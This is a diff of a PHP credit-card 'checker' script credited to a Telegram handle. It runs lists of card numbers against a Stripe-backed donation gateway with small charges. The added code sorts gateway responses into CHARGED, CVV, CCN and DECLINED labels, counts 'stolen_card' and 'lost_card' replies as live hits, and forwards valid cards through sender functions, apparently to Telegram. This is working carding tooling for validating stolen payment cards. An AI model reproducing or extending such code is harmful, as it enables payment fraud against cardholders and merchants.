@@ -11,7 +11,7 @@ $newDelay = $delay / 1000;
 sleep($newDelay);
 
 $amt = '10$';
-$owner = "<a href='t.me/isnotdevbot'>isnotdev</a>";
+$owner = "@isnotdevbot";
 $gateways = 'Stripe CCN 10$';
 
 ### FUNCTIONS
@@ -311,39 +311,165 @@ if (isset($token['id'])) {
  $req = "Req 2";
 }
 
-### BIN CHECK
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
-curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
- 'Host: lookup.binlist.net',
- 'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
- 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
-));
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, '');
-$binresp = curl_exec($ch);
-$binresp = json_decode($binresp, true);
-$bank = $binresp['bank']['name'];
-$country = $binresp['country']['name'];
-$emoji = $binresp['country']['emoji'];
-$brand = $binresp['brand'];
-$scheme = $binresp['scheme'];
-$type = $binresp['type'];
+// telegram @isnotdev
 
-if (strpos($binresp, '"type":"credit"') !== false) {
- $type = 'Credit';
-} else {
- $type = 'Debit';
+// -- merchant -- //
+### CHARGED
+if (strpos($resp, '"__typename":"Donation"')) {
+ echo '<span class="charges">#CHARGED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card has been successfully charged. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CHARGED]: <code>$lista</code> { msg: Your card has been successfully charged. } $gateways - $owner ";
+ chargeSender($chrg, $artSender);
 }
 
-include 'response/apiresp.php';
+### DECLINED
+elseif (strpos($resp, "The card has expired. Check the expiration date or use a different card.")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: The card has expired. Check the expiration date or use a different card. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif (strpos($resp, "The card has been declined for an unknown reason.")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: The card has been declined for an unknown reason. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif (strpos($resp, 'Invalid account.')) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Invalid account. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif (strpos($resp, "We were unable to process your order, please try again.")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: We were unable to process your order, please try again. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif (strpos($resp, "There was a problem encountered while processing your donation.")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: There was a problem encountered while processing your donation. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif ((strpos($resp, "Suspicious activity detected. Try again in a few minutes.")) || (strpos($resp, "Anti-spam triggered, please wait and try again later."))) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Anti-spam triggered, please wait and try again later. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif (strpos($resp, "Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider.")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif (strpos($resp, "Anti-fraud triggered, please wait and try again later.")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Anti-fraud triggered, please wait and try again later. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+}
 
-### FIXING RESPONSE
-/* echo "$resp - $req<br>"; // UNCOMMENT IF IT WILL USE IN SITE CHECKER
-echo "$orgID - $campID";
-echo "api: $req<br>"; */
+// -- stripe -- //
+### CHARGED
+elseif (strpos($resp, '"status":"succeeded"')) {
+ echo '<span class="charges">#CHARGED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card has been successfully charged. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CHARGED]: <code>$lista</code> { msg: Your card has been successfully charged. } $gateways - $owner ";
+ chargeSender($chrg, $artSender);
+}
+
+### CVV
+elseif (strpos($resp, '"cvc_check": "pass"')) {
+ echo '<span class="approved">#CVV: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: CVC Check Pass. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CVV]: <code>$lista</code> { msg: CVC Check Pass. } $gateways - $owner ";
+ hitSender($w2s, $artSender);
+} elseif
+ ((strpos($resp, "Your card zip code is incorrect.")) || (strpos($resp, "incorrect_zip"))) {
+ echo '<span class="approved">#CVV: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card zip code is incorrect. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CVV]: <code>$lista</code> { msg: Your card zip code is incorrect. } $gateways - $owner ";
+ hitSender($w2s, $artSender);;
+} elseif
+ (strpos($resp, "Thank you! For security reasons your order is currently being reviewed.")) {
+ echo '<span class="approved">#CVV: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Thank you! For security reasons your order is currently being reviewed. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CVV]: <code>$lista</code> { msg: Thank you! For security reasons your order is currently being reviewed. } $gateways - $owner ";
+ hitSender($w2s, $artSender);
+} elseif
+ ((strpos($resp, "Your card does not support this type of purchase.")) || (strpos($resp, "transaction_not_allowed"))) {
+ echo '<span class="approved">#CVV: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card does not support this type of purchase. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CVV]: <code>$lista</code> { msg: Your card does not support this type of purchase. } $gateways - $owner ";
+ hitSender($w2s, $artSender);
+} elseif
+ ((strpos($resp, "Your card has insufficient funds.")) || (strpos($resp, "insufficient_funds"))) {
+ echo '<span class="approved">#CVV: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card has insufficient funds. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CVV]: <code>$lista</code> { msg: Your card has insufficient funds. } $gateways - $owner ";
+ hitSender($w2s, $artSender);
+}
+
+### CCN
+elseif ((strpos($resp, "security code is incorrect.")) || (strpos($resp, "incorrect_cvc")) || (strpos($resp, "Your card's security code is incorrect."))) {
+ echo '<span class="approved">#CCN: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card’s security code is incorrect. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CCN]: <code>$lista</code> { msg: Your card’s security code is incorrect. } $gateways - $owner ";
+ hitSender($w2s, $artSender);
+}
+
+### LIVE
+elseif (strpos($resp, "stolen_card")) {
+ echo '<span class="approved">#CCN: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Stolen Card. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CCN]: <code>$lista</code> { msg: Stolen Card. } $gateways - $owner ";
+ hitSender($w2s, $artSender);
+} elseif
+ (strpos($resp, "lost_card")) {
+ echo '<span class="approved">#CCN: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Lost Card. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CCN]: <code>$lista</code> { msg: Lost Card. } $gateways - $owner ";
+ hitSender($w2s, $artSender);
+} elseif
+ (strpos($resp, "pickup_card")) {
+ echo '<span class="approved">#CCN: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Pickup Card. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CCN]: <code>$lista</code> { msg: Pickup Card. } $gateways - $owner ";
+ hitSender($w2s, $artSender);
+} elseif
+ (strpos($resp, '"cvc_check": "fail"')) {
+ echo '<span class="approved">#CCN: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: CVC Check Fail. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CCN]: <code>$lista</code> { msg: CVC Check Fail. } $gateways - $owner ";
+ hitSender($w2s, $artSender);
+} elseif
+ ((strpos($resp, "security code is invalid.")) || (strpos($resp, "invalid_cvc"))) {
+ echo '<span class="approved">#CCN: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card’s security code is invalid. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+ $artSender = "[CCN]: <code>$lista</code> { msg: Your card's security code is invalid. } $gateways - $owner ";
+ hitSender($w2s, $artSender);
+}
+
+### DECLINED
+elseif
+ ((strpos($resp, "Your card was declined.")) || (strpos($resp, "card_declined")) || (strpos($resp, 'Your card was declined'))) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card was declined. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif ((strpos($resp, 'Your card has expired.')) || (strpos($resp, "expired_card"))) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card has expired. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ ((strpos($resp, "Your card number is incorrect.")) || (strpos($resp, "incorrect_number"))) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card number is incorrect. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "generic_decline")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Generic declined. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "Your card's expiration month is invalid")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Your card’s expiration month is invalid. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "do_not_honor")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Do not honor. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "processing_error")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Processing error. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "service_not_allowed")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Service not allowed. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, '"cvc_check": "unchecked"')) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: CVC Check Unchecked. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, '"cvc_check": "unavailable"')) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: CVC Check Unavailable. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "parameter_invalid_empty")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Parameter invalid empty. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "lock_timeout")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Lock timeout. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ ((strpos($resp, "three_d_secure_redirect")) || (strpos($resp, "requires_action"))) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: 3D secure redirect. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "Card is declined by your bank, please contact them for additional information.")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Card is declined by your bank, please contact them for additional information. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "missing_payment_information")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Missing payment information. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "Payment cannot be processed, missing credit card number")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Payment cannot be processed, missing credit card number. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} elseif
+ (strpos($resp, "Transaction declined")) {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Transaction declined. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+}
+
+### ERROR
+elseif
+ ((strpos($resp, "-1")) || (strpos($resp, 'api_key_expired'))) {
+ echo '<span class="declined">#ERROR: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: API Down. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+} else {
+ echo '<span class="declined">#DECLINED: </span><span class="crds"> '.$lista.' </span><span class="msg"> { msg: Unknown Reason. } </span><span class="gatew"> '.$gateways.' - '.$owner.'</span><br>';
+}
+
 # TELEGRAM: @isnotdev
 
 // 盗まないでよクソ野郎！
